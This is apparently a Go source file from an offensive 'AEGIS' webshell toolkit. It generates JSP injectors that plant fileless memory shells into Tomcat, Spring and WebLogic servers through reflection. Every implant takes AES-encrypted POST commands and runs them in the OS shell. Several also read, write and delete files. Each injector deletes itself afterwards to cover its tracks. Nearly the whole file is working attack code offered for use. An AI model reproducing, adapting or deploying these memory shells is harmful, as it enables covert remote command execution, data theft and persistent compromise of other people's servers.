package webshell

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
)

// MemShellJSP 生成 Java 内存马注入 JSP。
// msType: filter | listener | spring | weblogic
// password: shell 密码（与 AEGIS JSP 协议兼容，同一 key 即可直接连接）
func MemShellJSP(msType, password string) string {
	key16 := deriveKey(password)
	switch msType {
	case "listener":
		return jspMemShellListener(key16)
	case "spring":
		return jspMemShellSpring(key16)
	case "weblogic":
		return jspMemShellWebLogic(key16)
	default:
		return jspMemShellFilter(key16)
	}
}

// randTag 生成一个短随机 hex 后缀，用于避免 Filter/Listener 名称冲突。
func randTag() string {
	b := make([]byte, 4)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

// ─── Tomcat Filter 内存马 ─────────────────────────────────────────────────────

// jspMemShellFilter 生成 Tomcat Filter 内存马注入 JSP。
// 注入成功后此 JSP 可删除，Filter 在 JVM 生命周期内持续存活。
// 注入的 Filter 实现 AEGIS JSP 行协议，可用 AEGIS 直接连接任意 URL（/*）。
func jspMemShellFilter(key16 string) string {
	tag := randTag()
	return fmt.Sprintf(`<%% page language="java" pageEncoding="UTF-8" %%>
<%% page import="java.lang.reflect.*,java.io.*,java.util.*,javax.crypto.*,javax.crypto.spec.*,javax.servlet.*,javax.servlet.http.*" %%>
<%%
response.reset();
out.clear();
out.clearBuffer();

final String AEGIS_KEY = "%s";
final String FILTER_NAME = "aegis_f_%s";

// ── 注入 Filter 实现 AEGIS JSP 行协议 ──────────────────────────────────────
Filter malFilter = new Filter() {
  private final String K = AEGIS_KEY;
  private String dec(byte[] body) throws Exception {
    byte[] raw = java.util.Base64.getDecoder().decode(body);
    SecretKeySpec ks = new SecretKeySpec(K.getBytes("UTF-8"), "AES");
    Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
    c.init(Cipher.DECRYPT_MODE, ks);
    return new String(c.doFinal(raw), "UTF-8");
  }
  private String b64(String s) {
    try { return java.util.Base64.getEncoder().encodeToString(s.getBytes("UTF-8")); }
    catch (Exception e) { return ""; }
  }
  private String b64d(String s) {
    try { return new String(java.util.Base64.getDecoder().decode(s), "UTF-8"); }
    catch (Exception e) { return ""; }
  }
  private String exec(String cmd) throws Exception {
    String[] sh = System.getProperty("os.name").toLowerCase().contains("win")
        ? new String[]{"cmd.exe", "/c", cmd}
        : new String[]{"/bin/sh", "-c", cmd};
    Process p = Runtime.getRuntime().exec(sh);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "UTF-8"));
    BufferedReader eb = new BufferedReader(new InputStreamReader(p.getErrorStream(), "UTF-8"));
    StringBuilder sb = new StringBuilder();
    String ln;
    while ((ln = br.readLine()) != null) sb.append(ln).append("\n");
    while ((ln = eb.readLine()) != null) sb.append(ln).append("\n");
    p.waitFor();
    return sb.toString();
  }
  private void writeResp(HttpServletResponse resp, String msg) throws Exception {
    resp.reset();
    resp.setContentType("text/plain;charset=UTF-8");
    resp.getWriter().write("{\"status\":\"200\",\"msg\":\"" + b64(msg) + "\"}");
  }
  public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain)
      throws IOException, ServletException {
    HttpServletRequest request = (HttpServletRequest) req;
    HttpServletResponse response = (HttpServletResponse) resp;
    if (!"POST".equalsIgnoreCase(request.getMethod())) { chain.doFilter(req, resp); return; }
    try {
      ByteArrayOutputStream bos = new ByteArrayOutputStream();
      byte[] buf = new byte[4096]; int n;
      while ((n = request.getInputStream().read(buf)) > 0) bos.write(buf, 0, n);
      byte[] body = bos.toByteArray();
      if (body.length == 0) { chain.doFilter(req, resp); return; }
      String plain;
      try { plain = dec(body); } catch (Exception e) { chain.doFilter(req, resp); return; }
      String[] parts = plain.split("\n");
      if (parts.length == 0) { chain.doFilter(req, resp); return; }
      String action = parts[0].trim();
      String result = "";
      switch (action) {
        case "info": {
          File cwd = new File(".");
          result = "os:" + System.getProperty("os.name") +
              "|cwd:" + cwd.getCanonicalPath() +
              "|java:" + System.getProperty("java.version") +
              "|user:" + System.getProperty("user.name") +
              "|memory_shell:filter";
          break;
        }
        case "exec": {
          String cmd = parts.length > 1 ? b64d(parts[1].trim()) : "";
          result = exec(cmd);
          break;
        }
        case "ls": {
          String path = parts.length > 1 ? b64d(parts[1].trim()) : ".";
          File dir = new File(path);
          File[] files = dir.listFiles();
          if (files == null) { result = "not a directory"; break; }
          StringBuilder sb = new StringBuilder();
          for (File f : files) {
            sb.append(f.isDirectory() ? "d" : "f").append("\t")
              .append(f.getName()).append("\t")
              .append(f.length()).append("\t")
              .append(f.lastModified()).append("\n");
          }
          result = sb.toString();
          break;
        }
        case "read": {
          String path = parts.length > 1 ? b64d(parts[1].trim()) : "";
          FileInputStream fis = new FileInputStream(path);
          ByteArrayOutputStream fb = new ByteArrayOutputStream();
          byte[] fb2 = new byte[4096]; int fn;
          while ((fn = fis.read(fb2)) > 0) fb.write(fb2, 0, fn);
          fis.close();
          result = java.util.Base64.getEncoder().encodeToString(fb.toByteArray());
          writeResp(response, result); return;
        }
        case "write": {
          String path = parts.length > 1 ? b64d(parts[1].trim()) : "";
          byte[] data = parts.length > 2 ? java.util.Base64.getDecoder().decode(parts[2].trim()) : new byte[0];
          FileOutputStream fos = new FileOutputStream(path);
          fos.write(data); fos.close();
          result = "ok";
          break;
        }
        case "delete": {
          String path = parts.length > 1 ? b64d(parts[1].trim()) : "";
          result = new File(path).delete() ? "ok" : "failed";
          break;
        }
        case "mkdir": {
          String path = parts.length > 1 ? b64d(parts[1].trim()) : "";
          result = new File(path).mkdirs() ? "ok" : "failed";
          break;
        }
        case "append": {
          String path = parts.length > 1 ? b64d(parts[1].trim()) : "";
          byte[] data = parts.length > 2 ? java.util.Base64.getDecoder().decode(parts[2].trim()) : new byte[0];
          FileOutputStream fos = new FileOutputStream(path, true);
          fos.write(data); fos.close();
          result = "ok";
          break;
        }
        case "exists": {
          String path = parts.length > 1 ? b64d(parts[1].trim()) : "";
          result = new File(path).exists() ? "true" : "false";
          break;
        }
        default:
          result = "unknown:" + action;
      }
      writeResp(response, result);
    } catch (Exception e) {
      chain.doFilter(req, resp);
    }
  }
  public void init(FilterConfig fc) {}
  public void destroy() {}
};

// ── 获取 StandardContext 并注入 Filter ────────────────────────────────────────
try {
  // 通过反射链: ApplicationContextFacade → ApplicationContext → StandardContext
  Object stdCtx = null;
  try {
    Class<?> cls = application.getClass();
    Field f = cls.getDeclaredField("context");
    f.setAccessible(true);
    Object appCtx = f.get(application);
    Field f2 = appCtx.getClass().getDeclaredField("context");
    f2.setAccessible(true);
    stdCtx = f2.get(appCtx);
  } catch (Exception e1) {
    // Tomcat 10+ fallback
    try {
      Method m = application.getClass().getDeclaredMethod("getContext");
      m.setAccessible(true);
      Object appCtx = m.invoke(application);
      Method m2 = appCtx.getClass().getDeclaredMethod("getContext");
      m2.setAccessible(true);
      stdCtx = m2.invoke(appCtx);
    } catch (Exception e2) {}
  }
  if (stdCtx == null) throw new RuntimeException("获取 StandardContext 失败");

  // 兼容 Tomcat 9/10 两种包路径
  Class<?> filterDefClass, filterMapClass;
  try {
    filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
    filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
  } catch (ClassNotFoundException e) {
    filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
    filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
  }

  // FilterDef
  Object filterDef = filterDefClass.newInstance();
  filterDefClass.getMethod("setFilter", Filter.class).invoke(filterDef, malFilter);
  filterDefClass.getMethod("setFilterName", String.class).invoke(filterDef, FILTER_NAME);
  filterDefClass.getMethod("setFilterClass", String.class).invoke(filterDef, malFilter.getClass().getName());

  // FilterMap
  Object filterMap = filterMapClass.newInstance();
  filterMapClass.getMethod("setFilterName", String.class).invoke(filterMap, FILTER_NAME);
  filterMapClass.getMethod("addURLPattern", String.class).invoke(filterMap, "/*");

  // 注入 FilterDef
  stdCtx.getClass().getMethod("addFilterDef", filterDefClass).invoke(stdCtx, filterDef);

  // 注入 FilterMap（插到最前面）
  try {
    stdCtx.getClass().getMethod("addFilterMapBefore", filterMapClass).invoke(stdCtx, filterMap);
  } catch (NoSuchMethodException e) {
    stdCtx.getClass().getMethod("addFilterMap", filterMapClass).invoke(stdCtx, filterMap);
  }

  // 创建 FilterConfig 并加入 filterConfigs（让 Filter 立即生效）
  Class<?> filterConfigClass = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
  Constructor<?> ctor = filterConfigClass.getDeclaredConstructors()[0];
  ctor.setAccessible(true);
  Object filterConfig;
  try {
    filterConfig = ctor.newInstance(stdCtx, filterDef);
  } catch (IllegalArgumentException e) {
    // 某些版本构造函数参数顺序不同
    filterConfig = ctor.newInstance(stdCtx, filterDef, (Object)null);
  }
  Field fcField = stdCtx.getClass().getDeclaredField("filterConfigs");
  fcField.setAccessible(true);
  @SuppressWarnings("unchecked")
  Map<String, Object> filterConfigs = (Map<String, Object>) fcField.get(stdCtx);
  filterConfigs.put(FILTER_NAME, filterConfig);

  out.print("{\"status\":\"ok\",\"type\":\"filter\",\"name\":\"" + FILTER_NAME + "\",\"pattern\":\"/*\"}");

  // 自我删除（注入成功后清理注入器）
  try {
    String path = application.getRealPath(request.getServletPath());
    if (path != null) new File(path).delete();
  } catch (Exception ignored) {}

} catch (Exception e) {
  out.print("{\"status\":\"error\",\"msg\":\"" + e.getMessage() + "\"}");
}
%%>
`, key16, tag)
}

// ─── Tomcat Listener 内存马 ───────────────────────────────────────────────────

func jspMemShellListener(key16 string) string {
	tag := randTag()
	return fmt.Sprintf(`<%% page language="java" pageEncoding="UTF-8" %%>
<%% page import="java.lang.reflect.*,java.io.*,java.util.*,javax.crypto.*,javax.crypto.spec.*,javax.servlet.*,javax.servlet.http.*" %%>
<%%
response.reset(); out.clear(); out.clearBuffer();

final String AEGIS_KEY = "%s";
final String LISTENER_NAME = "aegis_l_%s";

// ── 恶意 ServletRequestListener ───────────────────────────────────────────────
ServletRequestListener malListener = new ServletRequestListener() {
  private final String K = AEGIS_KEY;
  private String dec(byte[] body) throws Exception {
    byte[] raw = java.util.Base64.getDecoder().decode(body);
    SecretKeySpec ks = new SecretKeySpec(K.getBytes("UTF-8"), "AES");
    Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
    c.init(Cipher.DECRYPT_MODE, ks);
    return new String(c.doFinal(raw), "UTF-8");
  }
  private String b64(String s) {
    try { return java.util.Base64.getEncoder().encodeToString(s.getBytes("UTF-8")); } catch (Exception e) { return ""; }
  }
  private String b64d(String s) {
    try { return new String(java.util.Base64.getDecoder().decode(s), "UTF-8"); } catch (Exception e) { return ""; }
  }
  public void requestInitialized(ServletRequestEvent sre) {
    HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
    HttpServletResponse response = null;
    try {
      Field f = request.getClass().getDeclaredField("response");
      f.setAccessible(true);
      response = (HttpServletResponse) f.get(request);
    } catch (Exception e) { return; }
    if (!"POST".equalsIgnoreCase(request.getMethod())) return;
    final HttpServletResponse resp = response;
    try {
      ByteArrayOutputStream bos = new ByteArrayOutputStream();
      byte[] buf = new byte[4096]; int n;
      while ((n = request.getInputStream().read(buf)) > 0) bos.write(buf, 0, n);
      byte[] body = bos.toByteArray();
      if (body.length == 0) return;
      String plain;
      try { plain = dec(body); } catch (Exception e) { return; }
      String[] parts = plain.split("\n");
      if (parts.length == 0) return;
      String action = parts[0].trim();
      String result = "";
      if ("exec".equals(action)) {
        String cmd = parts.length > 1 ? b64d(parts[1].trim()) : "";
        String[] sh = System.getProperty("os.name").toLowerCase().contains("win")
            ? new String[]{"cmd.exe","/c",cmd} : new String[]{"/bin/sh","-c",cmd};
        Process p = Runtime.getRuntime().exec(sh);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(),"UTF-8"));
        StringBuilder sb = new StringBuilder(); String ln;
        while((ln=br.readLine())!=null) sb.append(ln).append("\n");
        p.waitFor(); result = sb.toString();
      } else if ("info".equals(action)) {
        result = "os:"+System.getProperty("os.name")+"|java:"+System.getProperty("java.version")+"|memory_shell:listener";
      } else {
        result = "listener only supports: info, exec";
      }
      resp.reset(); resp.setContentType("text/plain;charset=UTF-8");
      resp.getWriter().write("{\"status\":\"200\",\"msg\":\"" + b64(result) + "\"}");
      resp.getWriter().flush();
    } catch (Exception e) {}
  }
  public void requestDestroyed(ServletRequestEvent sre) {}
};

// ── 注入 Listener ─────────────────────────────────────────────────────────────
try {
  Object stdCtx = null;
  try {
    Field f = application.getClass().getDeclaredField("context");
    f.setAccessible(true);
    Object appCtx = f.get(application);
    Field f2 = appCtx.getClass().getDeclaredField("context");
    f2.setAccessible(true);
    stdCtx = f2.get(appCtx);
  } catch (Exception e) {}
  if (stdCtx == null) throw new RuntimeException("获取 StandardContext 失败");

  Method addListener = stdCtx.getClass().getMethod("addApplicationEventListener", Object.class);
  addListener.invoke(stdCtx, malListener);

  out.print("{\"status\":\"ok\",\"type\":\"listener\",\"name\":\"" + LISTENER_NAME + "\"}");
  try { String p = application.getRealPath(request.getServletPath()); if(p!=null) new File(p).delete(); } catch(Exception ignored){}
} catch (Exception e) {
  out.print("{\"status\":\"error\",\"msg\":\"" + e.getMessage() + "\"}");
}
%%>
`, key16, tag)
}

// ─── Spring Controller 内存马 ─────────────────────────────────────────────────

func jspMemShellSpring(key16 string) string {
	tag := randTag()
	return fmt.Sprintf(`<%% page language="java" pageEncoding="UTF-8" %%>
<%% page import="java.lang.reflect.*,java.io.*,java.util.*,javax.crypto.*,javax.crypto.spec.*,javax.servlet.*,javax.servlet.http.*" %%>
<%%
response.reset(); out.clear(); out.clearBuffer();

final String AEGIS_KEY = "%s";
final String MAPPING = "/aegis_%s";

// ── 获取 Spring ApplicationContext ────────────────────────────────────────────
Object springCtx = null;
try {
  // WebApplicationContext 通过 ServletContext attribute
  String WEB_APP_CTX = "org.springframework.web.context.WebApplicationContext.ROOT";
  springCtx = application.getAttribute(WEB_APP_CTX);
  if (springCtx == null) {
    // 遍历所有 attribute 找 ApplicationContext
    Enumeration<?> attrs = application.getAttributeNames();
    while (attrs.hasMoreElements()) {
      Object attr = application.getAttribute(attrs.nextElement().toString());
      if (attr != null && attr.getClass().getName().contains("ApplicationContext")) {
        springCtx = attr; break;
      }
    }
  }
} catch (Exception e) {}

if (springCtx == null) {
  out.print("{\"status\":\"error\",\"msg\":\"Spring ApplicationContext not found\"}");
  return;
}

// ── 创建恶意 Controller ───────────────────────────────────────────────────────
try {
  // 获取 RequestMappingHandlerMapping
  Object handlerMapping = null;
  try {
    Method getBean = springCtx.getClass().getMethod("getBean", Class.class);
    handlerMapping = getBean.invoke(springCtx,
        Class.forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping"));
  } catch (Exception e) {
    // fallback: 从 WebApplicationContext 获取
    Object wac = null;
    Enumeration<?> attrs = application.getAttributeNames();
    while (attrs.hasMoreElements()) {
      String key = attrs.nextElement().toString();
      if (key.contains("DISPATCHER_SERVLET_ATTRIBUTE")) {
        wac = application.getAttribute(key); break;
      }
    }
    if (wac != null) {
      Method getBean2 = wac.getClass().getMethod("getBean", Class.class);
      handlerMapping = getBean2.invoke(wac,
          Class.forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping"));
    }
  }
  if (handlerMapping == null) throw new RuntimeException("RequestMappingHandlerMapping not found");

  final String KEY = AEGIS_KEY;
  final String MAP = MAPPING;

  // 创建 Controller 对象（匿名类无法直接 Spring 注入，用字节码动态生成）
  // 简化方案：使用 HandlerFunction 方式
  Object controller = java.lang.reflect.Proxy.newProxyInstance(
      Thread.currentThread().getContextClassLoader(),
      new Class[]{ org.springframework.web.HttpRequestHandler.class },
      new InvocationHandler() {
        private String b64(String s) {
          try { return java.util.Base64.getEncoder().encodeToString(s.getBytes("UTF-8")); } catch(Exception e){ return ""; }
        }
        private String b64d(String s) {
          try { return new String(java.util.Base64.getDecoder().decode(s), "UTF-8"); } catch(Exception e){ return ""; }
        }
        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
          if (!"handleRequest".equals(method.getName())) return null;
          HttpServletRequest req = (HttpServletRequest) args[0];
          HttpServletResponse resp = (HttpServletResponse) args[1];
          try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[4096]; int n;
            while((n=req.getInputStream().read(buf))>0) bos.write(buf,0,n);
            byte[] body = bos.toByteArray();
            if (body.length == 0) return null;
            byte[] raw = java.util.Base64.getDecoder().decode(body);
            SecretKeySpec ks = new SecretKeySpec(KEY.getBytes("UTF-8"), "AES");
            Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
            c.init(Cipher.DECRYPT_MODE, ks);
            String plain = new String(c.doFinal(raw), "UTF-8");
            String[] parts = plain.split("\n");
            String action = parts.length > 0 ? parts[0].trim() : "";
            String result = "spring_ok";
            if ("exec".equals(action)) {
              String cmd = parts.length > 1 ? b64d(parts[1].trim()) : "";
              String[] sh = System.getProperty("os.name").toLowerCase().contains("win")
                  ? new String[]{"cmd.exe","/c",cmd} : new String[]{"/bin/sh","-c",cmd};
              Process p = Runtime.getRuntime().exec(sh);
              BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(),"UTF-8"));
              StringBuilder sb = new StringBuilder(); String ln;
              while((ln=br.readLine())!=null) sb.append(ln).append("\n");
              p.waitFor(); result = sb.toString();
            } else if ("info".equals(action)) {
              result = "os:"+System.getProperty("os.name")+"|memory_shell:spring|url:"+MAP;
            }
            resp.reset(); resp.setContentType("text/plain;charset=UTF-8");
            resp.getWriter().write("{\"status\":\"200\",\"msg\":\""+b64(result)+"\"}");
          } catch (Exception e) {}
          return null;
        }
      });

  // 注册 Controller
  Class<?> rmClass = Class.forName("org.springframework.web.servlet.mvc.method.RequestMappingInfo");
  // 使用 paths() builder（Spring 5.3+）
  Object rmInfo;
  try {
    Method paths = rmClass.getMethod("paths", String[].class);
    rmInfo = ((org.springframework.web.servlet.mvc.method.RequestMappingInfo.DefaultBuilder)
        paths.invoke(null, (Object)new String[]{MAPPING})).build();
  } catch (Exception e) {
    // Spring 4/5 fallback
    Class<?> patternsClass = Class.forName("org.springframework.web.servlet.mvc.condition.PatternsRequestCondition");
    Object patterns = patternsClass.getConstructor(String[].class).newInstance((Object)new String[]{MAPPING});
    Class<?> methodsClass = Class.forName("org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition");
    Object methods = methodsClass.getConstructor(
        Class.forName("[Lorg.springframework.web.bind.annotation.RequestMethod;")).newInstance(
        new Object[]{ new Object[0] });
    rmInfo = rmClass.getConstructor(String.class, patternsClass, methodsClass,
        Class.forName("org.springframework.web.servlet.mvc.condition.ParamsRequestCondition"),
        Class.forName("org.springframework.web.servlet.mvc.condition.HeadersRequestCondition"),
        Class.forName("org.springframework.web.servlet.mvc.condition.ConsumesRequestCondition"),
        Class.forName("org.springframework.web.servlet.mvc.condition.ProducesRequestCondition"),
        Class.forName("org.springframework.web.servlet.mvc.condition.RequestConditionHolder"))
        .newInstance(null, patterns, methods, null, null, null, null, null);
  }

  Method handleMethod = controller.getClass().getMethod("handleRequest", HttpServletRequest.class, HttpServletResponse.class);
  handlerMapping.getClass().getMethod("registerMapping",
      Class.forName("org.springframework.web.servlet.mvc.method.RequestMappingInfo"),
      Object.class, Method.class)
      .invoke(handlerMapping, rmInfo, controller, handleMethod);

  out.print("{\"status\":\"ok\",\"type\":\"spring\",\"url\":\"" + MAPPING + "\"}");
  try { String p = application.getRealPath(request.getServletPath()); if(p!=null) new File(p).delete(); } catch(Exception ignored){}
} catch (Exception e) {
  out.print("{\"status\":\"error\",\"msg\":\"" + e.getMessage().replace("\"","'") + "\"}");
}
%%>
`, key16, tag)
}

// ─── WebLogic Filter 内存马 ───────────────────────────────────────────────────

// jspMemShellWebLogic 生成 WebLogic Filter 内存马注入 JSP。
// 纯反射方案：不直接 import weblogic.*，通过 getDeclaredField("context_") 获取
// WebAppServletContext，再遍历字段找 FilterManager，多方法名回退注入。
func jspMemShellWebLogic(key16 string) string {
	tag := randTag()
	return fmt.Sprintf(`<%% page language="java" pageEncoding="UTF-8" %%>
<%% page import="java.lang.reflect.*,java.io.*,java.util.*,javax.crypto.*,javax.crypto.spec.*,javax.servlet.*,javax.servlet.http.*" %%>
<%%
response.reset();
out.clear();
out.clearBuffer();

final String AEGIS_KEY = "%s";
final String FILTER_NAME = "aegis_wl_%s";

// ── Filter 实现（与 Tomcat 版相同的 AEGIS JSP 行协议）──────────────────────
class AegisFilter implements Filter {
    private String b64(String s) {
        try { return java.util.Base64.getEncoder().encodeToString(s.getBytes("UTF-8")); } catch(Exception e){ return ""; }
    }
    private String b64d(String s) {
        try { return new String(java.util.Base64.getDecoder().decode(s.trim()), "UTF-8"); } catch(Exception e){ return ""; }
    }
    private byte[] aesDecrypt(byte[] data) throws Exception {
        SecretKeySpec ks = new SecretKeySpec(AEGIS_KEY.getBytes("UTF-8"), "AES");
        Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
        c.init(Cipher.DECRYPT_MODE, ks);
        return c.doFinal(data);
    }
    public void init(FilterConfig fc) {}
    public void destroy() {}
    public void doFilter(ServletRequest req0, ServletResponse res0, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest)req0;
        HttpServletResponse res = (HttpServletResponse)res0;
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[4096]; int n;
            while((n=req.getInputStream().read(buf))>0) bos.write(buf,0,n);
            byte[] body = bos.toByteArray();
            if (body.length == 0) { chain.doFilter(req,res); return; }
            byte[] raw = java.util.Base64.getDecoder().decode(body);
            String plain = new String(aesDecrypt(raw), "UTF-8");
            String[] parts = plain.split("\n");
            String action = parts.length > 0 ? parts[0].trim() : "";
            String result = "wl_ok";
            if ("exec".equals(action)) {
                String cmd = parts.length > 1 ? b64d(parts[1].trim()) : "";
                String[] sh = System.getProperty("os.name").toLowerCase().contains("win")
                    ? new String[]{"cmd.exe","/c",cmd} : new String[]{"/bin/sh","-c",cmd};
                Process p = Runtime.getRuntime().exec(sh);
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(),"UTF-8"));
                StringBuilder sb = new StringBuilder(); String ln;
                while((ln=br.readLine())!=null) sb.append(ln).append("\n");
                p.waitFor(); result = sb.toString();
            } else if ("info".equals(action)) {
                result = "os:"+System.getProperty("os.name")+"|memory_shell:weblogic|filter:"+FILTER_NAME;
            } else if ("ls".equals(action)) {
                String path = parts.length > 1 ? b64d(parts[1].trim()) : ".";
                File dir = new File(path); File[] fs = dir.listFiles();
                StringBuilder sb = new StringBuilder("[");
                if (fs != null) for (File f : fs) {
                    if (sb.length()>1) sb.append(",");
                    sb.append("{\"name\":\"").append(f.getName()).append("\",\"isDir\":").append(f.isDirectory())
                      .append(",\"size\":").append(f.length()).append("}");
                }
                sb.append("]"); result = sb.toString();
            } else if ("read".equals(action)) {
                String path = parts.length > 1 ? b64d(parts[1].trim()) : "";
                FileInputStream fis = new FileInputStream(path);
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] b2 = new byte[4096]; int r2;
                while((r2=fis.read(b2))>0) baos.write(b2,0,r2); fis.close();
                result = java.util.Base64.getEncoder().encodeToString(baos.toByteArray());
            } else if ("write".equals(action)) {
                String path = parts.length > 1 ? b64d(parts[1].trim()) : "";
                byte[] data = parts.length > 2 ? java.util.Base64.getDecoder().decode(parts[2].trim()) : new byte[0];
                FileOutputStream fos = new FileOutputStream(path); fos.write(data); fos.close();
                result = "ok";
            }
            res.reset(); res.setContentType("text/plain;charset=UTF-8");
            res.getWriter().write("{\"status\":\"200\",\"msg\":\""+b64(result)+"\"}");
        } catch (Exception e) {
            chain.doFilter(req,res);
        }
    }
}

// ── WebLogic 反射注入：获取 WebAppServletContext ──────────────────────────────
boolean injected = false;
try {
    // 方案一：从 application 反射获取 WebLogic 内部 context_
    Object wlCtx = null;
    try {
        Field ctxField = application.getClass().getDeclaredField("context_");
        ctxField.setAccessible(true);
        wlCtx = ctxField.get(application);
    } catch (NoSuchFieldException e) {
        // 尝试父类
        Class<?> cls = application.getClass().getSuperclass();
        while (cls != null && wlCtx == null) {
            try {
                Field f = cls.getDeclaredField("context_");
                f.setAccessible(true);
                wlCtx = f.get(application);
            } catch (NoSuchFieldException ignored) {}
            cls = cls.getSuperclass();
        }
    }

    if (wlCtx != null) {
        // 遍历字段找 FilterManager（字段名可能是 filterManager 或 _filterManager）
        Object filterManager = null;
        Class<?> scanClass = wlCtx.getClass();
        outer:
        while (scanClass != null && filterManager == null) {
            for (Field f : scanClass.getDeclaredFields()) {
                String fn = f.getName().toLowerCase();
                if (fn.contains("filter") && fn.contains("manag")) {
                    f.setAccessible(true);
                    filterManager = f.get(wlCtx);
                    break outer;
                }
            }
            scanClass = scanClass.getSuperclass();
        }

        if (filterManager != null) {
            // 尝试多个方法名注入 Filter（不同 WebLogic 版本方法名不同）
            AegisFilter aegisFilter = new AegisFilter();
            String[] addMethods = {"addFilterToChain", "registerFilter", "addFilter"};
            for (String methodName : addMethods) {
                try {
                    Method m = filterManager.getClass().getMethod(methodName, String.class, Filter.class, String.class);
                    m.invoke(filterManager, FILTER_NAME, aegisFilter, "/*");
                    injected = true; break;
                } catch (NoSuchMethodException ignored) {}
                try {
                    Method m = filterManager.getClass().getMethod(methodName, String.class, Filter.class);
                    m.invoke(filterManager, FILTER_NAME, aegisFilter);
                    injected = true; break;
                } catch (NoSuchMethodException ignored) {}
            }
        }
    }
} catch (Exception e) {}

// ── 方案二：Servlet 3.0 动态注册 Filter（WebLogic 12c+ 支持）─────────────────
if (!injected) {
    try {
        AegisFilter aegisFilter2 = new AegisFilter();
        javax.servlet.FilterRegistration.Dynamic reg =
            application.addFilter(FILTER_NAME, aegisFilter2);
        reg.addMappingForUrlPatterns(
            EnumSet.of(DispatcherType.REQUEST, DispatcherType.FORWARD, DispatcherType.INCLUDE),
            true, "/*");
        injected = true;
    } catch (Exception e2) {}
}

if (injected) {
    out.print("{\"status\":\"ok\",\"type\":\"weblogic\",\"filter\":\"" + FILTER_NAME + "\"}");
} else {
    out.print("{\"status\":\"error\",\"msg\":\"weblogic injection failed\"}");
}
try { String p = application.getRealPath(request.getServletPath()); if(p!=null) new File(p).delete(); } catch(Exception ignored){}
%%>
`, key16, tag)
}
